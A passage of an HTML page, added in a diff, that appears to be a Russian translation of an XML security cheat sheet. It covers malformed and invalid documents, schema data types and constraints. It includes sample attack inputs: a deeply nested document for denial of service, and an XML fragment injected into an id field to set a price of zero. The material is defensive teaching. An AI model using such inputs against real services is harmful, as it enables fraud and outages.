+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Деление на ноль
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-nan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Специальные значения: бесконечность и не-число (NaN)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Общие ограничения данных
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Общие ограничения данных">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Перечисляемые значения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Диапазоны
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      Паттерны
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Утверждения
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Кратность вхождений
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      Сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Сверхбольшие полезные нагрузки">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      Традиционные сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      «Маленькие» сверхбольшие полезные нагрузки
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      Локальное отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Локальное отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      Встроенная схема
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      Некорректные права доступа
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      Удалённое отравление схемы
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Удалённое отравление схемы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mitm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атака «человек посередине» (MitM)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отравление DNS-кэша
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      Атака злонамеренного сотрудника
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Расширение XML-сущностей
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Расширение XML-сущностей">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примеры уязвимых реализаций на Java
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Примеры уязвимых реализаций на Java">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xxe-dom" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием DOM
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-dom4j" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием DOM4J
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-sax" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием SAX
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-stax" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE с использованием StAX
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      Рекурсивная ссылка на сущность
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      Квадратичное расширение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#billion-laughs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Billion Laughs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      Отражённое извлечение файлов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подделка запросов на стороне сервера (SSRF)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Подделка запросов на стороне сервера (SSRF)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Внешнее разрешение DNS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      Внешнее соединение
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      Извлечение файлов с параметрическими сущностями
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      Сканирование портов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      Брутфорс
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="xml">Шпаргалка по безопасности XML<a class="headerlink" href="#xml" title="Permanent link">&para;</a></h1>
+<h2 id="_1">Введение<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Хотя спецификации XML и XML-схем предоставляют инструменты для защиты XML-приложений, они также содержат множество уязвимостей безопасности. Их можно использовать для проведения различных типов атак, включая извлечение файлов, подделку запросов на стороне сервера (SSRF), сканирование портов и брутфорс. В этой шпаргалке описывается, как злоумышленники могут использовать различные возможности XML в библиотеках и программном обеспечении через два возможных вектора атаки:</p>
+<ul>
+<li><strong>Некорректно сформированные XML-документы</strong>: Использование уязвимостей, возникающих, когда приложения встречают XML-документы, не являющиеся правильно сформированными.</li>
+<li><strong>Недопустимые XML-документы</strong>: Использование уязвимостей, возникающих, когда документы не имеют ожидаемой структуры.</li>
+</ul>
+<h2 id="xml-">Работа с некорректно сформированными XML-документами<a class="headerlink" href="#xml-" title="Permanent link">&para;</a></h2>
+<h3 id="xml-_1">Определение некорректно сформированного XML-документа<a class="headerlink" href="#xml-_1" title="Permanent link">&para;</a></h3>
+<p>Если XML-документ не соответствует определению правильно сформированного документа по спецификации W3C XML, он считается «некорректно сформированным». <strong>Если XML-документ некорректно сформирован, XML-парсер должен обнаружить критическую ошибку, остановить выполнение, документ не должен проходить никакой дополнительной обработки, а приложение должно выдать сообщение об ошибке.</strong> Некорректно сформированный документ может содержать одну или несколько из следующих проблем: отсутствующий закрывающий тег, порядок элементов в бессмысленной структуре, использование запрещённых символов и т.д.</p>
+<h3 id="xml-_2">Обработка некорректно сформированных XML-документов<a class="headerlink" href="#xml-_2" title="Permanent link">&para;</a></h3>
+<p><strong>Для работы с некорректными документами разработчики должны использовать XML-процессор, соответствующий спецификациям W3C и не тратящий значительного дополнительного времени на обработку некорректных документов.</strong> Кроме того, они должны использовать только правильно сформированные документы, проверять содержимое каждого элемента и обрабатывать только допустимые значения в пределах заранее определённых границ.</p>
+<h4 id="xml-_3">Некорректно сформированные XML-документы требуют дополнительного времени<a class="headerlink" href="#xml-_3" title="Permanent link">&para;</a></h4>
+<p><strong>Некорректный документ может влиять на потребление ресурсов центрального процессора (CPU).</strong> В определённых сценариях время, необходимое для обработки некорректных документов, может превышать время для правильно сформированных. Когда это происходит, злоумышленник может воспользоваться асимметричной атакой на ресурсы, используя большее время обработки для вызова отказа в обслуживании (DoS).</p>
+<p><strong>Для анализа вероятности такой атаки сравните время обработки обычного XML-документа со временем обработки его некорректной версии.</strong> Затем рассмотрите, как злоумышленник мог бы воспользоваться этой уязвимостью совместно с флуд-атакой XML через несколько документов для усиления эффекта.</p>
+<h3 id="_2">Приложения, обрабатывающие некорректные данные<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><strong>Некоторые XML-парсеры способны восстанавливать некорректные документы.</strong> Они могут пытаться вернуть допустимое дерево со всем содержимым, которое они могут разобрать, независимо от несоответствия документа спецификациям. <strong>Поскольку для процесса восстановления нет предопределённых правил, подход и результаты таких парсеров могут не всегда совпадать. Использование некорректных документов может привести к непредвиденным проблемам с целостностью данных.</strong></p>
+<p>Следующие два сценария иллюстрируют векторы атак, которые парсер будет анализировать в режиме восстановления:</p>
+<h4 id="_3">Некорректный документ → некорректный документ<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<p>Согласно спецификации XML, строка <code>--</code> (двойной дефис) не должна встречаться внутри комментариев. При использовании режима восстановления lxml и PHP следующий документ останется тем же после восстановления:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
+<span class="w"> </span><span class="cm">&lt;!-- один</span>
+<span class="cm">  &lt;!-- другой комментарий</span>
+<span class="cm"> комментарий --&gt;</span>
+<span class="nt">&lt;/element&gt;</span>
+</code></pre></div>
+<h4 id="_4">Правильно сформированный документ → нормализованный правильно сформированный документ<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>Некоторые парсеры могут нормализовывать содержимое секций <code>CDATA</code>. Это означает, что они обновят специальные символы в секции <code>CDATA</code>, заменив их безопасными версиями, хотя это и не является обязательным:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
+<span class="w"> </span><span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
+<span class="nt">&lt;/element&gt;</span>
+</code></pre></div>
+<p>Нормализация секции <code>CDATA</code> не является общим правилом для всех парсеров. Libxml мог бы преобразовать этот документ в его каноническую форму, но хотя он и правильно сформирован, его содержимое может считаться некорректным в зависимости от ситуации:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
+<span class="w"> </span><span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+<span class="nt">&lt;/element&gt;</span>
+</code></pre></div>
+<h3 id="_5">Обработка принудительного парсинга<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><strong>Одна из популярных принудительных атак на XML включает парсинг глубоко вложенных XML-документов без соответствующих закрывающих тегов. Идея состоит в том, чтобы заставить жертву исчерпать ресурсы машины и вызвать отказ в обслуживании на целевом объекте.</strong> Сообщения о DoS-атаке в Firefox 3.67 включали использование 30 000 открытых XML-элементов без соответствующих закрывающих тегов. Удаление закрывающих тегов упрощает атаку, поскольку требует лишь половины размера правильно сформированного документа для достижения тех же результатов. Количество обрабатываемых тегов в итоге вызвало переполнение стека. Упрощённая версия такого документа выглядит так:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;A1&gt;</span>
+<span class="w"> </span><span class="nt">&lt;A2&gt;</span>
+<span class="w">  </span><span class="nt">&lt;A3&gt;</span>
+<span class="w">   </span>...
+<span class="w">    </span><span class="nt">&lt;A30000&gt;</span>
+</code></pre></div>
+<h2 id="xml_1">Нарушение правил спецификации XML<a class="headerlink" href="#xml_1" title="Permanent link">&para;</a></h2>
+<p>Манипулирование документами с использованием парсеров, не следующих спецификациям W3C, может привести к неожиданным последствиям. <strong>Может быть возможным достичь сбоев и/или выполнения кода, когда программное обеспечение неправильно проверяет, как обрабатывать некорректные структуры XML. Подача программному обеспечению фаззинговых XML-документов может выявить такое поведение.</strong></p>
+<h2 id="xml-_4">Работа с недопустимыми XML-документами<a class="headerlink" href="#xml-_4" title="Permanent link">&para;</a></h2>
+<p><strong>Злоумышленники могут вводить неожиданные значения в документы, чтобы воспользоваться приложением, не проверяющим наличие в документе допустимого набора значений.</strong> Схемы задают ограничения, помогающие определить, являются ли документы допустимыми: допустимый документ правильно сформирован и соответствует ограничениям схемы. Для проверки документа может использоваться несколько схем, а ограничения могут быть расположены в нескольких файлах — как с единым языком схем, так и с использованием возможностей различных языков схем.</p>
+<p>Рекомендация по предотвращению этих уязвимостей: каждый XML-документ должен иметь точно определённую XML-схему (не <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>) с надлежащим ограничением каждого элемента информации во избежание проблем с некорректной проверкой данных. Используйте локальную копию или хорошо известный репозиторий вместо ссылки на схему, указанной в XML-документе. Также выполняйте проверку целостности файла XML-схемы, помня о возможности компрометации репозитория. В случаях, когда XML-документы используют удалённые схемы, настраивайте серверы на использование только безопасных зашифрованных коммуникаций для предотвращения перехвата сетевого трафика злоумышленниками.</p>
+<h3 id="_6">Документ без схемы<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>Рассмотрим книготорговца, использующего веб-сервис через веб-интерфейс для совершения транзакций. XML-документ для транзакций состоит из двух элементов: значения <code>id</code>, связанного с товаром, и определённой <code>price</code>. Пользователь может вводить только определённое значение <code>id</code> через веб-интерфейс:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="nt">&lt;/buy&gt;</span>
+</code></pre></div>
+<p><strong>При отсутствии контроля над структурой документа приложение может также обрабатывать другие правильно сформированные сообщения с непредвиденными последствиями. Предыдущий документ мог бы содержать дополнительные теги, влияющие на поведение базового приложения, обрабатывающего его содержимое</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="nt">&lt;/buy&gt;</span>
+</code></pre></div>
+<p>Обратите внимание: значение 123 предоставляется как <code>id</code>, но теперь документ содержит дополнительные открывающие и закрывающие теги. Злоумышленник закрыл элемент <code>id</code> и установил поддельный элемент <code>price</code> со значением 0. Последний шаг для сохранения правильно сформированной структуры — добавление пустого элемента <code>id</code>. После этого приложение добавляет закрывающий тег для <code>id</code> и устанавливает <code>price</code> в 10. Если приложение обрабатывает только первые предоставленные значения ID и цены без контроля структуры, злоумышленник может купить книгу фактически бесплатно.</p>
+<h3 id="_7">Неограничительная схема<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p><strong>Некоторые схемы не предоставляют достаточных ограничений для типов данных, которые может получать каждый элемент.</strong> Это обычно происходит при использовании <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; у него очень ограниченный набор возможностей по сравнению с типами ограничений, применимых в XML-документах. Это может подвергать приложение нежелательным значениям внутри элементов или атрибутов, которые легко ограничить с помощью других языков схем. В следующем примере возраст (<code>age</code>) человека проверяется по встроенной схеме <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE person [</span>
+<span class="cp"> &lt;!ELEMENT person (name, age)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
+]&gt;
+<span class="nt">&lt;person&gt;</span>
+<span class="w"> </span><span class="nt">&lt;name&gt;</span>John<span class="w"> </span>Doe<span class="nt">&lt;/name&gt;</span>
+<span class="w"> </span><span class="nt">&lt;age&gt;</span>11111..(1.000.000<span class="w"> </span>цифр)..11111<span class="nt">&lt;/age&gt;</span>
+<span class="nt">&lt;/person&gt;</span>
+</code></pre></div>
+<p>Предыдущий документ содержит встроенную <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> с корневым элементом <code>person</code>. Этот элемент содержит два элемента в определённом порядке: <code>name</code>, затем <code>age</code>. Элемент <code>name</code> определён как содержащий <code>PCDATA</code>, аналогично элементу <code>age</code>.</p>
+<p>После этого определения начинается правильно сформированный и допустимый XML-документ. Элемент <code>name</code> содержит нерелевантное значение, но элемент <code>age</code> содержит миллион цифр. Поскольку нет ограничений на максимальный размер элемента <code>age</code>, эта строка из миллиона цифр может быть отправлена на сервер для этого элемента.</p>
+<p>Обычно такой элемент должен быть ограничен определённым количеством символов и набором допустимых символов (например, цифры от 0 до 9, знак + и знак -). При отсутствии надлежащих ограничений приложения могут обрабатывать потенциально недопустимые значения из документов.</p>
+<p>Поскольку невозможно указать конкретные ограничения (максимальную длину для элемента <code>name</code> или допустимый диапазон для элемента <code>age</code>), такой тип схемы увеличивает риск нарушения целостности и доступности ресурсов.</p>
+<h3 id="_8">Некорректная проверка данных<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p><strong>Когда схемы небезопасно определены и не предоставляют строгих правил, они могут подвергать приложение различным ситуациям. Результатом может быть раскрытие внутренних ошибок или документов, поражающих функциональность приложения неожиданными значениями.</strong></p>
+<h4 id="_9">Строковые типы данных<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
+<p>Если вам нужно использовать шестнадцатеричное значение, нет смысла определять его как строку, которая затем будет ограничена 16 шестнадцатеричными символами. Для примера: при использовании XML-шифрования некоторые значения должны быть закодированы в base64. Вот определение схемы того, как должны выглядеть эти значения:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherData&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xenc:CipherDataType&quot;</span><span class="nt">/&gt;</span>
+<span class="w"> </span><span class="nt">&lt;complexType</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherDataType&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;choice&gt;</span>
+<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;CipherValue&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;base64Binary&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;element</span><span class="w"> </span><span class="na">ref=</span><span class="s">&quot;xenc:CipherReference&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/choice&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/complexType&gt;</span>
+</code></pre></div>
+<p>Предыдущая схема определяет элемент <code>CipherValue</code> как тип данных base64. В качестве примера, IBM WebSphere DataPower SOA Appliance допускал любой тип символов внутри этого элемента после допустимого значения base64 и считал его допустимым.</p>
+<p>Первая часть этих данных правильно проверяется как значение base64, но оставшиеся символы могут быть чем угодно (включая другие подэлементы элемента <code>CipherData</code>). Ограничения частично заданы для элемента, что означает, что информация, вероятно, проверяется с помощью приложения, а не предложенной схемы.</p>
+<h4 id="_10">Числовые типы данных<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p><strong>Определение правильного типа данных для чисел может быть сложнее, поскольку вариантов больше, чем для строк.</strong></p>
+<h5 id="_11">Ограничения отрицательных и положительных значений<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h5>
+<p>Числовые типы данных XML-схемы могут включать различные диапазоны чисел:</p>
+<ul>
+<li><strong>negativeInteger</strong>: Только отрицательные числа</li>
+<li><strong>nonNegativeInteger</strong>: Положительные числа и ноль</li>
+<li><strong>positiveInteger</strong>: Только положительные числа</li>
+<li><strong>nonPositiveInteger</strong>: Отрицательные числа и ноль</li>
+</ul>
+<p>Следующий пример документа определяет <code>id</code> продукта, <code>price</code> и значение <code>quantity</code>, находящееся под контролем злоумышленника:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
+<span class="w"> </span><span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
+<span class="w"> </span><span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
+<span class="w"> </span><span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
+<span class="nt">&lt;/buy&gt;</span>
+</code></pre></div>
+<p><strong>Чтобы не повторять старых ошибок, можно определить XML-схему, предотвращающую обработку некорректной структуры в случаях, когда злоумышленник хочет ввести дополнительные элементы:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
+<span class="nt">&lt;/xs:schema&gt;</span>
+</code></pre></div>
+<p>Ограничение <code>quantity</code> типом данных integer позволит избежать неожиданных символов. Когда приложение получает предыдущее сообщение, оно может рассчитать итоговую цену как <code>price*quantity</code>. <strong>Однако, поскольку этот тип данных допускает отрицательные значения, злоумышленник, предоставив отрицательное число, может получить отрицательный результат на счёте пользователя. Чтобы избежать такой логической уязвимости, здесь следует использовать positiveInteger вместо integer.</strong></p>
+<h5 id="_12">Деление на ноль<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h5>
+<p><strong>Когда управляемые пользователем значения используются в качестве делителей, разработчики должны исключать значение ноль. В случаях, когда ноль используется для деления в XSLT, возникнет ошибка <code>FOAR0001</code>. Другие приложения могут выбрасывать иные исключения, и программа может дать сбой.</strong> Существуют специальные типы данных для XML-схем, явно исключающие ноль. Например, в случаях, когда отрицательные значения и ноль не являются допустимыми, схема может указать тип данных <code>positiveInteger</code> для элемента.</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<p>Элемент <code>denominator</code> теперь ограничен положительными целыми числами. Это означает, что допустимыми будут считаться только значения больше нуля. Если используется любой другой тип ограничения, при равенстве знаменателя нулю может возникнуть ошибка.</p>
+<h5 id="-nan">Специальные значения: бесконечность и не-число (NaN)<a class="headerlink" href="#-nan" title="Permanent link">&para;</a></h5>
+<p>Типы данных <code>float</code> и <code>double</code> содержат вещественные числа и некоторые специальные значения: <code>-Infinity</code> или <code>-INF</code>, <code>NaN</code> и <code>+Infinity</code> или <code>INF</code>. Эти возможности могут быть полезны для выражения определённых значений, но иногда ими злоупотребляют. Проблема в том, что они обычно используются для выражения только вещественных чисел, например цен. Это распространённая ошибка в других языках программирования, не ограниченная исключительно этими технологиями.</p>
+<p>Непринятие во внимание всего спектра возможных значений типа данных может приводить к сбоям базовых приложений. <strong>Если специальные значения <code>Infinity</code> и <code>NaN</code> не требуются и ожидаются только вещественные числа, рекомендуется использовать тип данных <code>decimal</code>:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/xs:sequence&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
+<span class="nt">&lt;/xs:schema&gt;</span>
+</code></pre></div>
+<p><strong>Значение price не будет вызывать ошибок при установке Infinity или NaN, поскольку эти значения не будут допустимыми. Злоумышленник может воспользоваться этой проблемой, если такие значения разрешены.</strong></p>
+<h4 id="_13">Общие ограничения данных<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>После выбора подходящего типа данных разработчики могут применять дополнительные ограничения. Иногда допустимым будет считаться лишь определённое подмножество значений типа данных:</p>
+<h5 id="_14">Перечисляемые значения<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h5>
+<p><strong>Определённые типы значений должны быть ограничены конкретными наборами: светофоры имеют только три цвета, существует только 12 месяцев и т.д. Схема может содержать эти ограничения для каждого элемента или атрибута. Это наиболее идеальный сценарий списка разрешённых значений для приложения: принимаются только конкретные значения. Такое ограничение называется <code>enumeration</code> (перечисление) в XML-схеме.</strong> Следующий пример ограничивает содержимое элемента <code>month</code> 12 возможными значениями:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;month&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;January&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;February&quot;</span><span class="nt">/&gt;</span>
